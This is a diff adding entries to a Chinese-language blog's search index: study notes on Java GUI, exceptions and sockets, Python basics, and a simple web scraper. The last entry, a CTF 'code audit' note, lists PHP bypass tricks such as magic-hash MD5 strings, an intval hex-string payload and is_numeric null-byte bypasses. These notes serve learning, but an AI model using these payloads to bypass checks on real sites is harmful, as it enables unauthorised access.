+    <title>Java-GUI编程</title>
+    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
+<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
+<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
+<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
+<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
+<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
+<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>GUI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java 异常及处理</title>
+    <url>/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
+    <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
+<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
+<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
+<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
+<p>不处理异常，将异常抛出给调用者。</p>
+<p><code>throw</code>  、<code>throws</code></p>
+<p>（挖坑待填）</p>
+<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
+<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
+<ol>
+<li>可能出现异常的代码用<code>try</code>块括起来</li>
+<li>用<code>catch</code>块来捕获异常并处理异常</li>
+<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
+</ol>
+<p><strong>代码执行过程的三种情况</strong></p>
+<ol>
+<li>
+<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
+</li>
+<li>
+<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
+</li>
+<li>
+<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
+</li>
+</ol>
+<blockquote>
+<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
+<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java网络编程</title>
+    <url>/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="SOCKET"><a class="header-anchor" href="#SOCKET"></a>SOCKET</h2>
+<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InetAddress类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getByName</span><span class="params">(String host)</span> <span class="comment">//根据域名获取ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getLocalHost</span><span class="params">()</span> <span class="comment">//获取本地ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostAddress</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的ip地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostName</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的域名</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(InetAddress address, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Socket <span class="title">accept</span><span class="params">()</span> <span class="comment">//服务器端接收socket连接请求，创建socket对象</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输入流，用于接收网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> OutputStream <span class="title">getOutputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输出流，用于发送网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getInetAddress</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程IP地址或null</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getLocalAddress</span><span class="params">()</span> <span class="comment">//获取套接字绑定的本地地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程端口号或0</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLocalPort</span><span class="params">()</span> <span class="comment">//返回此套接字绑定到的本地端口或 -1</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python实战</title>
+    <url>/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/</url>
+    <content><![CDATA[<h2 id="Python爬虫"><a class="header-anchor" href="#Python爬虫"></a>Python爬虫</h2>
+<p>从<a href="http://www.csu.edu.cn/index/xndh.htm">中南大学校内导航</a>中爬取校内网站名称和对应的链接。</p>
+<p>爬虫程序主要分为html页面获取和数据提取两个部分，接下来分别说明其实现方法。</p>
+<h3 id="获取网页"><a class="header-anchor" href="#获取网页"></a>获取网页</h3>
+<p>使用requests库来获取网站的html页面</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://www.csu.edu.cn/index/xndh.htm"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.raise_for_status()				<span class="comment">#检查r的状态码是否为200，若不是则抛出异常</span></span><br><span class="line">    r.encoding = r.apparent_encoding	<span class="comment">#设置编码方式为从内容中分析出的编码方式</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"error!"</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/20200225122713475.png" alt="img"></p>
+<p>encoding是从http中的header中的charset字段中提取的编码方式，若header中没有charset字段则默认为ISO-8859-1编码模式，则无法解析中文，产生乱码</p>
+<h3 id="提取内容"><a class="header-anchor" href="#提取内容"></a>提取内容</h3>
+<p>利用BeautifulSoup库可以很方便地对从HTML或XML文档中提取我们想要的数据。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = r.text</span><br><span class="line">soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)		<span class="comment">#将html解析成BeautifulSoup对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#BeautifulSoup类的find_all()函数可以从文档树中找到特定的标签（tag）</span></span><br><span class="line"><span class="comment">#这里获得所有的a标签</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>):</span><br><span class="line">    <span class="comment">#tag的属性值可直接用 tag_name['属性名'] 的方式获得</span></span><br><span class="line">    <span class="comment">#判断链接地址是否为一个网站</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> i[<span class="string">'href'</span>].find(<span class="string">'http'</span>):</span><br><span class="line">        <span class="comment"># 构造输出</span></span><br><span class="line">        <span class="comment"># tag_name.string 即 &lt;tag_name&gt;xxx&lt;/tag_name&gt; 中的xxx</span></span><br><span class="line">        str1 = <span class="string">"网址："</span> + str(i[<span class="string">'href'</span>]) + <span class="string">"   名称："</span> + str(i.string) + <span class="string">'\n'</span></span><br><span class="line">		<span class="comment"># 输出一条链接的地址及名称</span></span><br><span class="line">        print(str1)</span><br></pre></td></tr></table></figure>
+<p>利用以上代码就可以实现一个简单的爬虫程序了。</p>
+<p>爬虫的原理比较简单，关键在于如何对爬取到的数据进行筛选的过程。</p>
+<p>之后可以尝试对网页中的链接进行递归爬取等，</p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python基础</title>
+    <url>/2021/01/30/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
+    <content><![CDATA[<h2 id="待整理"><a class="header-anchor" href="#待整理"></a>待整理</h2>
+<h3 id="import-的使用"><a class="header-anchor" href="#import-的使用"></a>import 的使用</h3>
+<p>​	一个<code>.py</code>文件可以看作是一个模块（module），使用<code>import</code>命令将一个模块引入当前python文件，则可以在当前文件使用引入模块中定义的变量，函数等。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import module_name	#module_name.py文件可以在sys.path中或者当前文件所在文件夹中</span><br><span class="line">from module_name import xxx		#从module_name.py中引入xxx变量或者xxx函数</span><br><span class="line">from package_name import module_name	#从系统目录或当前目录的package_name包里找到module_name.py并引入</span><br></pre></td></tr></table></figure>
+<h3 id="python3-和-python2-在编码上的区别"><a class="header-anchor" href="#python3-和-python2-在编码上的区别"></a>python3 和 python2 在编码上的区别</h3>
+<p>​		在 Python2 中，字符串有两个类型，一个是 unicode，一个是 str，前者表示文本字符串，后者表示字节序列，不过两者并没有明显的界限，开发时容易出现编码错误。在 Python3 中对两者做了严格区分，分别用 str 表示字符串，bytes 表示字节序列，任何需要写入文本或者网络传输的数据都只接收字节序列，这就从源头上阻止了编码错误的问题。</p>
+<p>​		要指定一个字符串为 bytes 类型，有三种方法：</p>
+<ul>
+<li>字符串前（引号前）加上前缀<code>b</code> ，但这种方法仅支持 ASCII 字符串；</li>
+<li>使用<code>encode()</code>函数</li>
+<li>使用<code>bytes()</code>构造函数</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str_a = <span class="string">b"Hello World!"</span>				<span class="comment">#正确</span></span><br><span class="line">str_b = <span class="string">b"一个字符串。"</span>				<span class="comment">#错误</span></span><br><span class="line">str_c = <span class="string">"一个字符串"</span>.encode(<span class="string">'utf-8'</span>)	<span class="comment">#正确，不指定编码方式也默认以utf-8编码</span></span><br><span class="line">str_d = bytes(<span class="string">"abcde"</span>,<span class="string">'utf-8'</span>)		<span class="comment">#正确，第二个参数不可省略</span></span><br></pre></td></tr></table></figure>
+<p>C语言的 printf 函数不支持 Unicode 字符串的输出。在 python3 中想要调用C语言的printf函数，需要将参数由 Unicode 字符串转化为字节序列</p>
+<h3 id="类型转换函数"><a class="header-anchor" href="#类型转换函数"></a>类型转换函数</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool	根据传入的参数的逻辑值创建一个新的布尔值</span><br><span class="line">int		根据传入的参数创建一个新的整数</span><br><span class="line">float	根据传入的参数创建一个新的浮点数</span><br><span class="line"></span><br><span class="line">bin		将整数转换成2进制字符串</span><br><span class="line">oct		将整数转化成8进制数字符串</span><br><span class="line">hex		将整数转换成16进制字符串</span><br><span class="line"></span><br><span class="line">ord		返回Unicode字符对应的整数</span><br><span class="line">chr		返回整数所对应的Unicode字符</span><br><span class="line">str		返回一个对象的字符串表现形式</span><br><span class="line"></span><br><span class="line">tuple	根据传入的参数创建一个新的元组</span><br><span class="line">list	根据传入的参数创建一个新的列表</span><br><span class="line">dict	根据传入的参数创建一个新的字典</span><br><span class="line">set		根据传入的参数创建一个新的集合</span><br></pre></td></tr></table></figure>
+<h3 id="字符串常用函数"><a class="header-anchor" href="#字符串常用函数"></a>字符串常用函数</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.字母处理：</span></span><br><span class="line">.upper()    <span class="comment"># 全部大写</span></span><br><span class="line">.lower()    <span class="comment"># 全部小写</span></span><br><span class="line">.swapcase()    <span class="comment"># 大小写互换</span></span><br><span class="line">.capitalize()    <span class="comment"># 首字母大写，其余小写</span></span><br><span class="line">.title()    <span class="comment"># 首字母大写</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.格式化相关</span></span><br><span class="line">.ljust(width)     <span class="comment"># 获取固定长度，左对齐，右边不够用空格补齐</span></span><br><span class="line">.rjust(width)     <span class="comment"># 获取固定长度，右对齐，左边不够用空格补齐</span></span><br><span class="line">.center(width)  <span class="comment"># 获取固定长度，中间对齐，两边不够用空格补齐</span></span><br><span class="line">.zfill(width)      <span class="comment"># 获取固定长度，右对齐，左边不足用0补齐</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.字符串搜索相关</span></span><br><span class="line">.find()    <span class="comment"># 搜索指定字符串，没有返回-1</span></span><br><span class="line">.index()    <span class="comment"># 同上，但是找不到会报错</span></span><br><span class="line">.rfind()    <span class="comment"># 从右边开始查找</span></span><br><span class="line">.count()    <span class="comment"># 统计指定的字符串出现的次数</span></span><br></pre></td></tr></table></figure>
+<h3 id="文件操作"><a class="header-anchor" href="#文件操作"></a>文件操作</h3>
+<h4 id="文件写入"><a class="header-anchor" href="#文件写入"></a>文件写入</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file1 = open(<span class="string">"file_name"</span>,<span class="string">"mode"</span>)</span><br><span class="line">file1.write()</span><br><span class="line">file1.close</span><br></pre></td></tr></table></figure>
+<p>mode如下表所示</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>'r'</code></td>
+<td style="text-align:center">打开阅读（默认）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>'w'</code></td>
+<td style="text-align:center">打开写入，首先截断文件</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>'x'</code></td>
+<td style="text-align:center">打开独占创建，如果文件已经存在则失败</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>'a'</code></td>
+<td style="text-align:center">打开写入，追加到文件末尾（如果存在）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>'b'</code></td>
+<td style="text-align:center">二进制模式</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>'t'</code></td>
+<td style="text-align:center">文本模式（默认）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>'+'</code></td>
+<td style="text-align:center">打开磁盘文件进行更新（读取和写入）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="http"><a class="header-anchor" href="#http"></a>http</h3>
+<p>要在python程序中访问外部网站，可以使用<code>requests</code>模块，这是一个功能强大的http请求工具</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://example.com"</span></span><br><span class="line"><span class="comment">#获取响应包</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#判断相应包状态码，若不为200则抛出异常</span></span><br><span class="line">	r.raise_for_status()</span><br><span class="line">	<span class="comment">#设置编码方式为从内容中分析出的编码方式</span></span><br><span class="line">	r.encoding = r.apparent_encoding</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	print(<span class="string">"error!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取响应包内容</span></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<h3 id="输入输出"><a class="header-anchor" href="#输入输出"></a>输入输出</h3>
+<h4 id="输出"><a class="header-anchor" href="#输出"></a>输出</h4>
+<p><strong>print格式化字符串</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">'%d,%d'</span>%(i,j),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="输入"><a class="header-anchor" href="#输入"></a>输入</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = input(<span class="string">"input a number!\n"</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="数据结构"><a class="header-anchor" href="#数据结构"></a>数据结构</h3>
+<h4 id="list"><a class="header-anchor" href="#list"></a>list</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = []</span><br><span class="line">a.append(<span class="string">'a'</span>)	<span class="comment">#在列表最后加入一个元素'a'</span></span><br><span class="line">a.pop(<span class="number">0</span>)		<span class="comment">#删除列表中索引为0的元素</span></span><br><span class="line">a.insert(<span class="number">0</span>,<span class="string">'b'</span>)	<span class="comment">#在列表索引为0的位置插入元素'b',原本该位置及以后的元素后移一位</span></span><br><span class="line">a.index(<span class="string">'b'</span>)	<span class="comment">#返回元素'b'在列表中第一次出现的位置</span></span><br><span class="line">a.count(<span class="string">'b'</span>)	<span class="comment">#元素'b'在列表中出现的次数</span></span><br><span class="line">a.__len__()		<span class="comment">#返回列表的长度</span></span><br></pre></td></tr></table></figure>
+<h4 id="链表"><a class="header-anchor" href="#链表"></a>链表</h4>
+<p>python中没有指针，只能通过数组来实现静态的链表。把数组节点的下标当作链表节点的<code>地址</code>，首先定义节点类，节点类的对象数组即为我们想要的链表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#节点类定义如下</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, val=<span class="number">0</span>, next=None)</span>:</span></span><br><span class="line">		self.val = val</span><br><span class="line">		self.next = next</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代码审计</title>
+    <url>/2020/08/23/CTF/Web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<h2 id="PHP函数漏洞及其绕过姿势"><a class="header-anchor" href="#PHP函数漏洞及其绕过姿势"></a>PHP函数漏洞及其绕过姿势</h2>
+<h3 id="MD5"><a class="header-anchor" href="#MD5"></a>MD5</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a[]&#x3D;1;</span><br><span class="line">$b[]&#x3D;2;</span><br><span class="line">md5($a)&#x3D;&#x3D;&#x3D;md5($b);	&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
+<hr>
+<p>md5计算结果为<code>0e...</code>的，会被当做0处理</p>
+<p>以下这些字符串，md5哈希之后都是0e开头的：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;比较特殊的一个，加密前后进行比较的话会判断为相等</span><br><span class="line">0e215962017</span><br><span class="line">0e291242476940776845150308577824</span><br></pre></td></tr></table></figure>
+<h3 id="intval"><a class="header-anchor" href="#intval"></a>intval</h3>
+<p>得到一个数的整型值。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'+42'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'-42'</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'042'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'1e10'</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'0x1A'</span>);				  <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'420000000000000000000'</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">'foo'</span>, <span class="string">'bar'</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>比如在以下代码中</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">if</span>(intval($a)&lt;<span class="number">2020</span> &amp;&amp; intval($a+<span class="number">1</span>)&gt;<span class="number">2020</span>)</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure>
+<p>即可利用 intval 函数对字符串型16进制数的处理漏洞进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;0x10ff	&#x2F;&#x2F;在进行+1运算时，$a会被转换为数值型进行运算.</span><br></pre></td></tr></table></figure>
+<h3 id="is-numeric"><a class="header-anchor" href="#is-numeric"></a>is_numeric</h3>
+<p>PHP的is_numeric()函数会判断参数是否为数字或者数字字符串</p>
+<p>绕过方法：在要输入的数字后加上<code>%20</code>（空格），或者在数字前或后加上<code>%00</code>（终止符）</p>
+<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand"></a>mt_rand</h3>
+<p>生成伪随机数，利用<code>php_mt_seed</code>可以通过已知随机数数列爆破出随机数种子</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+</search>
